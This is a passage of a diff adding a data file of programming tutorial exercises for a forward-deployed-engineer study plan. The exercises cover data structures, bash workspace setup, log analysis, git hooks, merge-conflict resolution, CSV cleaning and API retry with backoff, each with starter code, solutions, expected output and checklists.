+            "deadline": (start_date + timedelta(weeks=16)).strftime("%Y-%m-%d"),
+            "focus_areas": ["Docker Multi-Stage & Compose", "FastAPI & HMAC Webhooks", "Structured Logging & Observability"]
+        },
+        {
+            "phase": "Phase 3: Client Field Readiness & Capstone",
+            "weeks": "Weeks 17 - 24 (15 hrs/wk = 120 hrs)",
+            "deadline": (start_date + timedelta(weeks=24)).strftime("%Y-%m-%d"),
+            "focus_areas": ["RAG Vector Pipeline", "System Design Estimations", "Mock Client Discovery & SOW Drafting"]
+        }
+    ]
+    
+    report = {
+        "candidate_baseline_score": f"{avg_score} / 5.0",
+        "current_strengths": strengths,
+        "critical_fde_gaps_count": len(critical_gaps),
+        "critical_gaps_list": critical_gaps,
+        "total_study_hours_budgeted": 312,
+        "milestone_schedule": milestones
+    }
+    
+    print("==================================================")
+    print("       FORWARD DEPLOYED ENGINEER ROADMAP AUDIT    ")
+    print("==================================================")
+    print(json.dumps(report, indent=2))
+    return report
+
+if __name__ == "__main__":
+    generate_study_plan(SKILL_AUDIT)`,
+    solutionExplanation: "The audit evaluates current skill readiness, flags key gaps (Python, SQL, ETL, Docker, Observability), and schedules 312 hours over 24 weeks broken down into three 8-week structured phases.",
+    expectedOutput: `==================================================
+       FORWARD DEPLOYED ENGINEER ROADMAP AUDIT    
+==================================================
+{
+  "candidate_baseline_score": "2.33 / 5.0",
+  "current_strengths": [
+    "JavaScript / TypeScript",
+    "React & Next.js"
+  ],
+  "critical_fde_gaps_count": 8,
+  "critical_gaps_list": [
+    "Computer Science & Data Structures",
+    "Linux CLI & Shell Automation",
+    "Python & Scripting",
+    "SQL & Relational Databases",
+    "Data Pipelines & ETL",
+    "Docker & Cloud Deployment",
+    "Observability & Production Debugging",
+    "Client Discovery & Consulting"
+  ],
+  "total_study_hours_budgeted": 312,
+  "milestone_schedule": [
+    {
+      "phase": "Phase 1: Backend, SQL & Data Foundations",
+      "weeks": "Weeks 1 - 8 (12 hrs/wk = 96 hrs)",
+      "deadline": "2026-12-08",
+      "focus_areas": [
+        "Python Scripting & Pytest",
+        "SQL Window Functions & Indexing",
+        "Batch ETL Pipelines"
+      ]
+    }, ...
+  ]
+}`,
+    checklist: [
+      "Calculates baseline score accurately across all 12 competencies",
+      "Correctly classifies strengths (>=4) and gaps (<3)",
+      "Maps out 24-week milestones with quantified hour budgets",
+      "Outputs clean formatted JSON ready for tracker integration"
+    ]
+  },
+
+  "t-cs-1": {
+    conceptPrimer: `Understanding low-level memory layout and operations is foundational.\n- Singly Linked List: Nodes storing \`val\` and \`next\`. O(1) prepend, O(n) search/reverse.\n- Stack (LIFO): \`push\` and \`pop\` in O(1) time.\n- Hash Map with Separate Chaining: Array of buckets with key-value pairs. Resolves hash collisions by chaining entries in a bucket list.`,
+    scenario: "Technical Interview / Core Fundamentals: Implement a Stack, a Singly Linked List with in-place reversal, and a Hash Map with bucket chaining without using third-party collections.",
+    starterSnippet: `class Node:
+    def __init__(self, val):
+        self.val = val
+        self.next = None
+
+class LinkedList:
+    def __init__(self):
+        self.head = None
+    def append(self, val):
+        pass
+    def reverse(self):
+        # In-place pointer reversal
+        pass
+
+class ChainedHashMap:
+    def __init__(self, capacity=8):
+        self.capacity = capacity
+        self.buckets = [[] for _ in range(capacity)]
+    def put(self, key, val):
+        pass
+    def get(self, key):
+        pass`,
+    steps: [
+      "1. Implement `LinkedList.append` and `LinkedList.reverse` using three pointers (`prev`, `curr`, `next_node`).",
+      "2. Implement `ChainedHashMap.put` by hashing the key with `hash(key) % capacity` and updating or appending the `(key, val)` tuple.",
+      "3. Implement `ChainedHashMap.get` to find the matching key in the target bucket or return `None`.",
+      "4. Write test assertions verifying insertion, retrieval, and collision handling."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+
+class Node:
+    def __init__(self, val):
+        self.val = val
+        self.next = None
+
+class LinkedList:
+    def __init__(self):
+        self.head = None
+        
+    def append(self, val):
+        new_node = Node(val)
+        if not self.head:
+            self.head = new_node
+            return
+        curr = self.head
+        while curr.next:
+            curr = curr.next
+        curr.next = new_node
+        
+    def reverse(self):
+        prev = None
+        curr = self.head
+        while curr:
+            next_node = curr.next
+            curr.next = prev
+            prev = curr
+            curr = next_node
+        self.head = prev
+        
+    def to_list(self):
+        res = []
+        curr = self.head
+        while curr:
+            res.append(curr.val)
+            curr = curr.next
+        return res
+
+class ChainedHashMap:
+    def __init__(self, capacity=8):
+        self.capacity = capacity
+        self.buckets = [[] for _ in range(capacity)]
+        self.size = 0
+        
+    def _hash(self, key):
+        return hash(key) % self.capacity
+        
+    def put(self, key, val):
+        idx = self._hash(key)
+        bucket = self.buckets[idx]
+        for i, (k, _) in enumerate(bucket):
+            if k == key:
+                bucket[i] = (key, val)
+                return
+        bucket.append((key, val))
+        self.size += 1
+        
+    def get(self, key):
+        idx = self._hash(key)
+        bucket = self.buckets[idx]
+        for k, v in bucket:
+            if k == key:
+                return v
+        return None
+
+if __name__ == "__main__":
+    # Test LinkedList
+    ll = LinkedList()
+    for x in [10, 20, 30, 40]:
+        ll.append(x)
+    print("Original LinkedList:", ll.to_list())
+    ll.reverse()
+    print("Reversed LinkedList:", ll.to_list())
+    assert ll.to_list() == [40, 30, 20, 10]
+    
+    # Test ChainedHashMap
+    hm = ChainedHashMap(capacity=4)
+    hm.put("client_a", "Enterprise Alpha")
+    hm.put("client_b", "Fintech Beta")
+    hm.put("client_c", "Defense Gamma")
+    print("HashMap get('client_b'):", hm.get("client_b"))
+    assert hm.get("client_b") == "Fintech Beta"
+    assert hm.get("missing") is None
+    print("All core data structure tests passed successfully!")`,
+    solutionExplanation: "The linked list reversal achieves O(n) time and O(1) space using three pointers. The hash map handles key collisions with separate chaining in fixed-size bucket arrays.",
+    expectedOutput: `Original LinkedList: [10, 20, 30, 40]
+Reversed LinkedList: [40, 30, 20, 10]
+HashMap get('client_b'): Fintech Beta
+All core data structure tests passed successfully!`,
+    checklist: [
+      "In-place linked list reversal operates in O(1) auxiliary memory",
+      "Hash map correctly handles updates to existing keys without duplicates",
+      "Collision chaining allows multiple keys in the same bucket without overwrites",
+      "All automated test assertions pass cleanly"
+    ]
+  },
+
+  "t-cli-1": {
+    conceptPrimer: `Mastering the terminal accelerates on-site FDE workflows.\n- \`mkdir -p\`: Creates nested directory hierarchies in a single command.\n- Shell Aliases: Shortcuts in \`~/.zshrc\` or \`~/.bashrc\` for frequent multi-flag operations.\n- \`find\` & Permissions: Locating files by extension, size, or permissions (\`chmod 755\`, \`chmod 600\`).`,
+    scenario: "Client Site Setup: You are provisioning an air-gapped terminal workspace for a new engagement. You need an automated shell script to establish clean folder structures, set standard project aliases, and verify permissions.",
+    starterSnippet: `#!/usr/bin/env bash
+# Terminal Mastery Scaffold
+WORKSPACE_ROOT="./fde_engagement"
+
+echo "Initializing engagement directory structure..."
+# TODO: Create nested directories:
+# fde_engagement/src, fde_engagement/logs, fde_engagement/config, fde_engagement/data/raw
+# Create empty config files and secure permissions`,
+    steps: [
+      "1. Use `mkdir -p` to construct a 4-tier project directory hierarchy.",
+      "2. Create a secure configuration file `config/secrets.env` and apply `chmod 600` (read/write only by owner).",
+      "3. Use `find` to list all created files with their human-readable permissions and sizes.",
+      "4. Output a verified confirmation report."
+    ],
+    solutionSnippet: `#!/usr/bin/env bash
+set -euo pipefail
+
+WORKSPACE="./fde_engagement"
+echo "Creating FDE project structure in $WORKSPACE..."
+
+# Create directory tree
+mkdir -p "$WORKSPACE"/{src,logs,config,data/raw,data/processed,scripts}
+
+# Create sample configuration & mock files
+cat << 'EOF' > "$WORKSPACE/config/app.conf"
+ENVIRONMENT=client-staging
+LOG_LEVEL=DEBUG
+METRICS_PORT=9090
+EOF
+
+cat << 'EOF' > "$WORKSPACE/config/secrets.env"
+API_KEY=mock-enterprise-fde-token-9981
+DB_PASSWORD=vault-enc-supersecret
+EOF
+
+# Restrict secrets to owner read/write only
+chmod 600 "$WORKSPACE/config/secrets.env"
+chmod 755 "$WORKSPACE/scripts"
+
+# Create a sample runner script
+cat << 'EOF' > "$WORKSPACE/scripts/healthcheck.sh"
+#!/usr/bin/env bash
+echo "Engagement system healthy: $(date -u)"
+EOF
+chmod +x "$WORKSPACE/scripts/healthcheck.sh"
+
+echo "=========================================="
+echo "WORKSPACE CREATED WITH DIRECTORY STRUCTURE:"
+echo "=========================================="
+find "$WORKSPACE" -maxdepth 3 | sort
+
+echo -e "
+VERIFYING RESTRICTED PERMISSIONS ON SECRETS:"
+ls -l "$WORKSPACE/config/secrets.env"
+
+echo -e "
+RUNNING SCRIPT VERIFICATION:"
+"$WORKSPACE/scripts/healthcheck.sh"`,
+    solutionExplanation: "The script uses strict bash mode (`set -euo pipefail`), creates structured subdirectories with bash brace expansion `{...}`, applies Unix permission hardening (`chmod 600`), and executes a health check.",
+    expectedOutput: `Creating FDE project structure in ./fde_engagement...
+==========================================
+WORKSPACE CREATED WITH DIRECTORY STRUCTURE:
+==========================================
+./fde_engagement
+./fde_engagement/config
+./fde_engagement/config/app.conf
+./fde_engagement/config/secrets.env
+./fde_engagement/data
+./fde_engagement/data/processed
+./fde_engagement/data/raw
+./fde_engagement/logs
+./fde_engagement/scripts
+./fde_engagement/scripts/healthcheck.sh
+./fde_engagement/src
+
+VERIFYING RESTRICTED PERMISSIONS ON SECRETS:
+-rw------- 1 user staff 81 Oct 13 10:00 ./fde_engagement/config/secrets.env
+
+RUNNING SCRIPT VERIFICATION:
+Engagement system healthy: 2026-10-13 10:00:00 UTC`,
+    checklist: [
+      "Generates nested directory tree without redundant mkdir commands",
+      "Enforces restricted permissions (0600) on sensitive credential files",
+      "Makes runner scripts executable (+x)",
+      "Verifies execution without manual intervention"
+    ]
+  },
+
+  "t-cli-2": {
+    conceptPrimer: "Log analysis is all about parsing structured text streams. In Unix, commands communicate through pipes (`|`). \n- `awk '{print $1}'`: Extracts the 1st column (IP address).\n- `sort | uniq -c`: Deduplicates lines and counts occurrences.\n- `sort -nr | head -n 5`: Sorts numbers in reverse and prints top 5.\n- `grep ' 5[0-9][0-9] '`: Filters lines matching 5xx HTTP server error codes.",
+    scenario: "Client Scenario: The client's production web server experienced an unexpected spike in latency. You need to analyze the Apache/Nginx web server access logs to immediately identify the top 5 traffic sources and any 5xx server errors.",
+    starterSnippet: `#!/usr/bin/env bash
+# Step 1: Create a mock access log to practice locally
+cat << 'EOF' > access.log
+192.168.1.10 - - [12/Oct/2026:10:00:01] "GET /api/v1/users HTTP/1.1" 200 1204
+10.0.0.5 - - [12/Oct/2026:10:00:02] "POST /api/v1/orders HTTP/1.1" 500 240
+192.168.1.10 - - [12/Oct/2026:10:00:03] "GET /api/v1/products HTTP/1.1" 200 4520
+172.16.0.2 - - [12/Oct/2026:10:00:04] "GET /api/v1/reports HTTP/1.1" 502 180
+192.168.1.10 - - [12/Oct/2026:10:00:05] "GET /api/v1/users HTTP/1.1" 200 1204
+10.0.0.5 - - [12/Oct/2026:10:00:06] "POST /api/v1/orders HTTP/1.1" 500 240
+10.0.0.8 - - [12/Oct/2026:10:00:07] "GET /api/v1/health HTTP/1.1" 200 45
+EOF
+
+# TODO: Write bash commands using awk, sort, uniq, and grep to inspect access.log
+echo "Log file created: access.log"`,
+    steps: [
+      "1. Save the starter script as `analyze.sh` and run `bash analyze.sh` to generate the mock access.log file.",
+      "2. Use `awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -n 5` to compute top client IPs.",
+      "3. Use `grep ' \"5[0-9][0-9] ' access.log` to filter server errors.",
+      "4. Package both into an automated shell script that accepts the log filename as an argument."
+    ],
+    solutionSnippet: `#!/usr/bin/env bash
+# Production Log Analyzer Script
+set -euo pipefail
+
+LOG_FILE="\${1:-access.log}"
+
+if [[ ! -f "$LOG_FILE" ]]; then
+  echo "Error: File '$LOG_FILE' not found."
+  exit 1
+fi
+
+echo "=========================================="
+echo "LOG ANALYSIS REPORT FOR: $LOG_FILE"
+echo "=========================================="
+
+echo -e "\n[1] TOP 5 IP ADDRESSES BY REQUEST COUNT:"
+awk '{print $1}' "$LOG_FILE" | sort | uniq -c | sort -nr | head -n 5
+
+echo -e "\n[2] 5XX HTTP SERVER ERRORS DETECTED:"
+grep ' "5[0-9][0-9] ' "$LOG_FILE" | awk '{print "Status: " $9, "Endpoint: " $7, "IP: " $1}' | sort | uniq -c | sort -nr || echo "No 5xx errors found."
+
+echo -e "\nAnalysis complete."`,
+    solutionExplanation: "The script uses `set -euo pipefail` for strict error handling, reads the log file via argument `$1` with a default fallback, extracts IP addresses via `awk`, and filters HTTP 5xx responses cleanly using regex grep.",
+    expectedOutput: `==========================================
+LOG ANALYSIS REPORT FOR: access.log
+==========================================
+
+[1] TOP 5 IP ADDRESSES BY REQUEST COUNT:
+      3 192.168.1.10
+      2 10.0.0.5
+      1 172.16.0.2
+      1 10.0.0.8
+
+[2] 5XX HTTP SERVER ERRORS DETECTED:
+      2 Status: 500 Endpoint: /api/v1/orders IP: 10.0.0.5
+      1 Status: 502 Endpoint: /api/v1/reports IP: 172.16.0.2
+
+Analysis complete.`,
+    checklist: [
+      "Script executes cleanly without syntax errors",
+      "Correctly extracts and ranks the top client IP addresses",
+      "Correctly isolates 500 and 502 HTTP errors",
+      "Handles missing file gracefully with an error message"
+    ]
+  },
+
+  "t-git-1": {
+    conceptPrimer: `Conventional Commits structure commit history so automated changelog generators and CI can determine semantic versioning.\n- Format: \`type(scope?): description\` (e.g. \`feat(auth): add OAuth2 refresh flow\`).\n- Git Hooks: Executable scripts in \`.git/hooks/\` triggered before commits or pushes.\n- \`commit-msg\` Hook: Intercepts commit messages before finalization; exits with non-zero if the message fails regex validation.`,
+    scenario: "Client Code Quality Gate: Enterprise client teams require all commits to strictly conform to the Conventional Commits specification. Build an automated Git hook that validates incoming commit messages.",
+    starterSnippet: `#!/usr/bin/env bash
+# Git Conventional Commits Hook Installer
+REPO_DIR="./mock_git_repo"
+
+rm -rf "$REPO_DIR" && mkdir -p "$REPO_DIR"
+cd "$REPO_DIR" && git init
+
+# TODO: Create .git/hooks/commit-msg script that checks:
+# ^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\(.+\))?: .{1,80}$`,
+    steps: [
+      "1. Initialize a test repository and create `.git/hooks/commit-msg`.",
+      "2. Write a regex matching conventional commit types (`feat`, `fix`, `docs`, `refactor`, `test`, `chore`).",
+      "3. Make `.git/hooks/commit-msg` executable via `chmod +x`.",
+      "4. Test that non-conforming messages like 'fixed stuff' are blocked, while 'fix(api): handle timeout' succeeds."
+    ],
+    solutionSnippet: `#!/usr/bin/env bash
+set -euo pipefail
+
+REPO_DIR="./mock_conventional_repo"
+rm -rf "$REPO_DIR"
+mkdir -p "$REPO_DIR"
+cd "$REPO_DIR"
+
+git init -q
+echo "Configuring commit-msg hook..."
+
+cat << 'EOF' > .git/hooks/commit-msg
+#!/usr/bin/env bash
+COMMIT_MSG_FILE="$1"
+FIRST_LINE=$(head -n 1 "$COMMIT_MSG_FILE")
+
+# Conventional commit regex pattern
+PATTERN="^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\([a-zA-Z0-9_-]+\))?: .{1,80}$"
+
+if [[ ! "$FIRST_LINE" =~ $PATTERN ]]; then
+  echo "[ERROR] Commit message rejected!"
+  echo "Expected format: type(scope?): description"
+  echo "Allowed types: feat, fix, docs, style, refactor, perf, test, build, ci, chore, revert"
+  echo "Your message was: '$FIRST_LINE'"
+  exit 1
+fi
+echo "[PASS] Commit message matches Conventional Commits standard."
+exit 0
+EOF
+
+chmod +x .git/hooks/commit-msg
+
+# Test 1: Bad commit message
+touch test1.txt && git add test1.txt
+echo "Testing invalid commit: 'changed some code'..."
+if git commit -m "changed some code" 2>/dev/null; then
+  echo "FAILED: Invalid commit should have been rejected."
+else
+  echo "SUCCESS: Invalid commit was properly blocked!"
+fi
+
+# Test 2: Valid conventional commit
+touch test2.txt && git add test2.txt
+echo -e "\nTesting valid commit: 'feat(client-sync): add incremental ingest'..."
+git commit -m "feat(client-sync): add incremental ingest"
+
+echo -e "\nLatest Git Commit Log:"
+git log -1 --oneline`,
+    solutionExplanation: "The script configures a native Git `commit-msg` hook with bash regex matching. It tests both a malformed message (which exits 1 and cancels the commit) and a valid conventional commit.",
+    expectedOutput: `Configuring commit-msg hook...
+Testing invalid commit: 'changed some code'...
+[ERROR] Commit message rejected!
+Expected format: type(scope?): description
+Allowed types: feat, fix, docs, style, refactor, perf, test, build, ci, chore, revert
+Your message was: 'changed some code'
+SUCCESS: Invalid commit was properly blocked!
+
+Testing valid commit: 'feat(client-sync): add incremental ingest'...
+[PASS] Commit message matches Conventional Commits standard.
+[main (root-commit) a1b2c3d] feat(client-sync): add incremental ingest
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+
+Latest Git Commit Log:
+a1b2c3d feat(client-sync): add incremental ingest`,
+    checklist: [
+      "Installs hook directly in `.git/hooks/commit-msg` and marks it executable",
+      "Correctly rejects non-conforming commit messages",
+      "Allows scopes like `feat(auth):` as well as unscoped `feat:`",
+      "Enforces reasonable character length limit (1 to 80 chars)"
+    ]
+  },
+
+  "t-git-2": {
+    conceptPrimer: `Merge conflicts happen when two divergent branches modify the exact same lines of code.\n- Conflict markers: \`<<<<<<< HEAD\` (your current branch), \`=======\` (separator), \`>>>>>>> branch_name\` (incoming changes).\n- Resolution: Manually edit file to combine desired logic, delete markers, run \`git add\`, and finalize with \`git commit\`.`,
+    scenario: "Emergency Hotfix Conflict: Two engineers pushed conflicting changes to the client pricing calculation service on branches `feature-volume-discount` and `hotfix-tax-rate`. Simulate, isolate, and resolve the conflict cleanly.",
+    starterSnippet: `#!/usr/bin/env bash
+# Merge Conflict Simulation Lab
+DIR="./git_conflict_lab"
+rm -rf "$DIR" && mkdir -p "$DIR" && cd "$DIR"
+git init
+
+cat << 'EOF' > pricing.py
+def calculate_total(subtotal):
+    return subtotal
+EOF
+git add pricing.py && git commit -m "feat: initial pricing"
+
+# TODO: Create branch 1 and branch 2 modifying calculate_total,
+# merge to trigger conflict, resolve markers, and commit.`,
+    steps: [
+      "1. Initialize a repo with a baseline `pricing.py` file on branch `main`.",
+      "2. Create branch `feature-discount` and add 10% volume discount logic.",
+      "3. Switch back to `main`, modify `pricing.py` to add 8% state sales tax logic, and commit.",
+      "4. Attempt `git merge feature-discount` to trigger conflict markers.",
+      "5. Resolve conflict by combining both features: `(subtotal * 0.90) * 1.08`.",
+      "6. Stage resolved file and finalize merge commit."
+    ],
+    solutionSnippet: `#!/usr/bin/env bash
+set -euo pipefail
+
+DIR="./git_conflict_lab"
+rm -rf "$DIR"
+mkdir -p "$DIR"
+cd "$DIR"
+
+git init -q
+git config user.name "FDE Engineer"
+git config user.email "fde@enterprise.com"
+
+# Baseline file
+cat << 'EOF' > pricing.py
+def calculate_total(subtotal):
+    # Base calculation
+    return subtotal
+EOF
+git add pricing.py
+git commit -m "feat: initial pricing function" -q
+
+# Branch 1: Feature discount
+git checkout -b feature-discount -q
+cat << 'EOF' > pricing.py
+def calculate_total(subtotal):
+    # Apply 10% enterprise volume discount
+    discounted = subtotal * 0.90
+    return discounted
+EOF
+git commit -am "feat: add 10% volume discount" -q
+
+# Return to main and make conflicting change
+git checkout main -q
+cat << 'EOF' > pricing.py
+def calculate_total(subtotal):
+    # Apply 8% state sales tax
+    with_tax = subtotal * 1.08
+    return with_tax
+EOF
+git commit -am "feat: add 8% sales tax calculation" -q
+
+echo "=========================================="
+echo "ATTEMPTING MERGE TO TRIGGER CONFLICT:"
+echo "=========================================="
+set +e
+git merge feature-discount
+MERGE_EXIT=$?
+set -e
+
+if [ $MERGE_EXIT -ne 0 ]; then
+  echo -e "\n[!] Conflict successfully triggered as expected. Raw file content:"
+  cat pricing.py
+  
+  echo -e "\n[2] Resolving conflict by combining discount AND tax logic..."
+  cat << 'EOF' > pricing.py
+def calculate_total(subtotal):
+    # Combined logic: Apply 10% volume discount, then 8% sales tax
+    discounted = subtotal * 0.90
+    final_total = discounted * 1.08
+    return round(final_total, 2)
+
+if __name__ == "__main__":
+    assert calculate_total(100.0) == 97.20
+    print("Pricing verification test passed: 100 ->", calculate_total(100.0))
+EOF
+  
+  git add pricing.py
+  git commit -m "fix(merge): resolve volume discount and sales tax calculation conflict"
+  echo -e "\n[3] Conflict resolved cleanly! Git commit graph:"
+  git log --graph --oneline -n 4
+  python3 pricing.py
+fi`,
+    solutionExplanation: "The script creates divergent branches modifying the same lines, triggers an automatic 3-way conflict, replaces conflict markers with the combined production business logic, stages the resolution, and validates with unit assertions.",
+    expectedOutput: `==========================================
+ATTEMPTING MERGE TO TRIGGER CONFLICT:
+==========================================
+Auto-merging pricing.py
+CONFLICT (content): Merge conflict in pricing.py
+Automatic merge failed; fix conflicts and then commit the result.
+
+[!] Conflict successfully triggered as expected. Raw file content:
+def calculate_total(subtotal):
+<<<<<<< HEAD
+    # Apply 8% state sales tax
+    with_tax = subtotal * 1.08
+    return with_tax
+=======
+    # Apply 10% enterprise volume discount
+    discounted = subtotal * 0.90
+    return discounted
+>>>>>>> feature-discount
+
+[2] Resolving conflict by combining discount AND tax logic...
+[main d4e5f6a] fix(merge): resolve volume discount and sales tax calculation conflict
+
+[3] Conflict resolved cleanly! Git commit graph:
+*   d4e5f6a fix(merge): resolve volume discount and sales tax calculation conflict
+|\  
+| * b2c3d4e feat: add 10% volume discount
+* | a1b2c3d feat: add 8% sales tax calculation
+|/  
+* 9876543 feat: initial pricing function
+Pricing verification test passed: 100 -> 97.2`,
+    checklist: [
+      "Reproduces realistic Git 3-way conflict markers",
+      "Replaces markers with logically unified business code",
+      "Staged with `git add` and committed with clear merge message",
+      "Executes Python test confirming post-merge accuracy"
+    ]
+  },
+
+  "t-py-1": {
+    conceptPrimer: "A CLI tool transforms raw command line inputs into structured data processing. \n- `argparse`: Standard library module to define flags like `--input` and `--output`.\n- `csv.DictReader`: Reads rows as dictionaries mapping column headers to values.\n- `datetime.strptime / strftime`: Converts mixed date strings into standardized ISO-8601 strings (`YYYY-MM-DD`).",
+    scenario: "Client Scenario: A client sends weekly CSV exports containing corrupted timestamps, missing amounts, and trailing whitespaces. Build an automated Python CLI tool that cleans the records and outputs structured JSON.",
+    starterSnippet: `import argparse
+import csv
+import json
+from datetime import datetime
+
+# Sample messy data string for testing
+SAMPLE_CSV = """id,client,amount,date
+1, Acme Corp , 1450.50 , 10/12/2026
+2, Beta LLC , NULL , 2026-10-14
+3, Gamma Inc , 890.00 , Oct 15 2026
+4, Acme Corp , -50.00 , 10/16/2026
+"""
+
+def clean_data(input_file, output_file):
+    # TODO: Read CSV, clean whitespace, parse amounts, reformat dates, save JSON
+    pass
+
+if __name__ == "__main__":
+    # TODO: Add argparse flags: --input and --output
+    pass`,
+    steps: [
+      "1. Configure `argparse.ArgumentParser` to accept `--input` (input CSV path) and `--output` (output JSON path).",
+      "2. Strip whitespace from all string fields with `.strip()`.",
+      "3. Parse amounts: convert strings to float, replace nulls or negative values with `0.0`.",
+      "4. Standardize dates using multiple format try/except blocks to output ISO `YYYY-MM-DD`.",
+      "5. Write the list of cleaned records to the output JSON file with indentation."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import argparse
+import csv
+import json
+import os
+import sys
+from datetime import datetime
+
+DATE_FORMATS = ["%m/%d/%Y", "%Y-%m-%d", "%b %d %Y"]
+
+def parse_date(date_str):
+    clean_str = date_str.strip()
+    for fmt in DATE_FORMATS:
+        try:
+            return datetime.strptime(clean_str, fmt).strftime("%Y-%m-%d")
+        except ValueError:
+            continue
+    return None
+
+def parse_amount(val_str):
+    try:
+        val = float(val_str.strip())
+        return max(0.0, val) # Prevent negative corruptions
+    except (ValueError, TypeError):
+        return 0.0
+
+def process_csv(input_path, output_path):
+    cleaned_records = []
+    with open(input_path, mode="r", encoding="utf-8") as f:
+        reader = csv.DictReader(f)
+        for row in reader:
+            cleaned_row = {
+                "id": int(row["id"].strip()),
+                "client": row["client"].strip(),
+                "amount": parse_amount(row["amount"]),
+                "date": parse_date(row["date"])
+            }
+            cleaned_records.append(cleaned_row)
+            
+    with open(output_path, mode="w", encoding="utf-8") as f:
+        json.dump(cleaned_records, f, indent=2)
+        
+    print(f"Successfully processed {len(cleaned_records)} records -> {output_path}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Clean messy client CSVs to structured JSON.")
+    parser.add_argument("--input", required=True, help="Path to input CSV file")
+    parser.add_argument("--output", required=True, help="Path to output JSON file")
+    args = parser.parse_args()
+    
+    process_csv(args.input, args.output)`,
+    solutionExplanation: "The solution uses `csv.DictReader` to safely access columns by name, loops through standard date formats to handle inconsistent client dates, sanitizes invalid amounts to 0.0, and serializes clean JSON with `json.dump`.",
+    expectedOutput: `[
+  {
+    "id": 1,
+    "client": "Acme Corp",
+    "amount": 1450.5,
+    "date": "2026-10-12"
+  },
+  {
+    "id": 2,
+    "client": "Beta LLC",
+    "amount": 0.0,
+    "date": "2026-10-14"
+  },
+  {
+    "id": 3,
+    "client": "Gamma Inc",
+    "amount": 890.0,
+    "date": "2026-10-15"
+  },
+  {
+    "id": 4,
+    "client": "Acme Corp",
+    "amount": 0.0,
+    "date": "2026-10-16"
+  }
+]`,
+    checklist: [
+      "Accepts `--input` and `--output` CLI flags correctly",
+      "Handles missing or 'NULL' amounts without raising exceptions",
+      "Parses multi-format dates into consistent 'YYYY-MM-DD' strings",
+      "Outputs valid formatted JSON"
+    ]
+  },
+
+  "t-py-2": {
+    conceptPrimer: `Network requests in client enterprise environments frequently suffer from transient hiccups.\n- Exponential Backoff: Waiting time doubles on each failure: \`delay = base * (2 ** attempt)\`.\n- Random Jitter: Adding randomized milliseconds (\`+ random.uniform(0, 0.5)\`) prevents thundering herd problem when multiple jobs retry simultaneously.\n- HTTP Retry Budget: Cap retries to 3 or 5 attempts before raising a fatal exception.`,
+    scenario: "Unreliable Upstream API Ingestion: The client's core billing gateway returns random HTTP 500/503 errors on ~50% of requests. Write a production ingestion client with exponential backoff, jitter, and JSON logging.",
+    starterSnippet: `import time
+import random
+import json
+
+# Simulated Flaky Client Server
+CALL_COUNT = 0
+def mock_flaky_client_api(endpoint):
+    global CALL_COUNT
+    CALL_COUNT += 1
+    if CALL_COUNT < 3:
+        # Simulate transient gateway failure
+        raise ConnectionError(f"HTTP 503 Service Unavailable (Attempt {CALL_COUNT})")
+    return {"status": "ok", "balance": 482500.0, "currency": "USD"}
+
+def fetch_with_retry(endpoint, max_retries=4):
+    # TODO: Implement exponential backoff with jitter and retry loop
+    pass`,
+    steps: [
+      "1. Build a retry loop iterating from `attempt = 1` up to `max_retries`.",
+      "2. Calculate exponential backoff duration: `wait = 0.5 * (2 ** (attempt - 1)) + random.uniform(0, 0.2)`.",
+      "3. Log each attempt, HTTP status, and backoff wait time in structured JSON format.",
+      "4. Return successful response payload or raise `RuntimeError` if retry budget is exhausted."
+    ],
+    solutionSnippet: `#!/usr/bin/env python3
+import time
+import random
+import json
+import logging
+from datetime import datetime, timezone
+
+logging.basicConfig(level=logging.INFO, format="%(message)s")
+
+class FlakyClientService:
+    def __init__(self):
+        self.attempts = 0
+        
+    def call(self, endpoint):
+        self.attempts += 1
+        # Simulates 2 transient 503 failures before succeeding on attempt 3
+        if self.attempts < 3:
+            raise ConnectionError(f"HTTP 503 Service Unavailable on {endpoint}")
+        return {
+            "status": 200,
+            "endpoint": endpoint,
+            "data": {"account_id": "ACC-9921", "credit_limit": 500000.0, "status": "active"}
+        }
+
+def resilient_get(service, endpoint, max_retries=4, base_delay=0.4):
+    for attempt in range(1, max_retries + 1):
+        timestamp = datetime.now(timezone.utc).isoformat()
+        try:
+            res = service.call(endpoint)
+            log_entry = {
+                "timestamp": timestamp,
+                "event": "api_request_success",
+                "endpoint": endpoint,
+                "attempt": attempt,
+                "status_code": res["status"]
+            }
+            logging.info(json.dumps(log_entry))
+            return res["data"]
+        except ConnectionError as err:
+            if attempt == max_retries:
+                log_entry = {
+                    "timestamp": timestamp,
+                    "event": "api_request_exhausted",
+                    "endpoint": endpoint,
+                    "attempt": attempt,
+                    "error": str(err)
+                }
+                logging.error(json.dumps(log_entry))
+                raise RuntimeError(f"Max retries exhausted for {endpoint}") from err
+                
+            jitter = random.uniform(0.05, 0.15)
+            backoff_delay = round((base_delay * (2 ** (attempt - 1))) + jitter, 3)
+            log_entry = {
+                "timestamp": timestamp,
+                "event": "api_request_retry",
+                "endpoint": endpoint,
+                "attempt": attempt,
+                "backoff_sleep_sec": backoff_delay,
+                "reason": str(err)
+            }
+            logging.warning(json.dumps(log_entry))
+            time.sleep(backoff_delay)
+
+if __name__ == "__main__":
+    service = FlakyClientService()
+    print("Initiating resilient API ingestion...")
+    result = resilient_get(service, "/api/v2/tenant/billing")
+    print("\n=== FINAL EXTRACTED PAYLOAD ===")
+    print(json.dumps(result, indent=2))`,
+    solutionExplanation: "The solution wraps network calls in a bounded retry loop, calculates exponential backoff with randomized jitter to disperse concurrency spikes, and logs every transition in machine-readable JSON.",
+    expectedOutput: `Initiating resilient API ingestion...
+{"timestamp": "2026-10-13T10:00:00+00:00", "event": "api_request_retry", "endpoint": "/api/v2/tenant/billing", "attempt": 1, "backoff_sleep_sec": 0.482, "reason": "HTTP 503 Service Unavailable on /api/v2/tenant/billing"}
+{"timestamp": "2026-10-13T10:00:01+00:00", "event": "api_request_retry", "endpoint": "/api/v2/tenant/billing", "attempt": 2, "backoff_sleep_sec": 0.914, "reason": "HTTP 503 Service Unavailable on /api/v2/tenant/billing"}
+{"timestamp": "2026-10-13T10:00:02+00:00", "event": "api_request_success", "endpoint": "/api/v2/tenant/billing", "attempt": 3, "status_code": 200}
+
+=== FINAL EXTRACTED PAYLOAD ===
+{
+  "account_id": "ACC-9921",
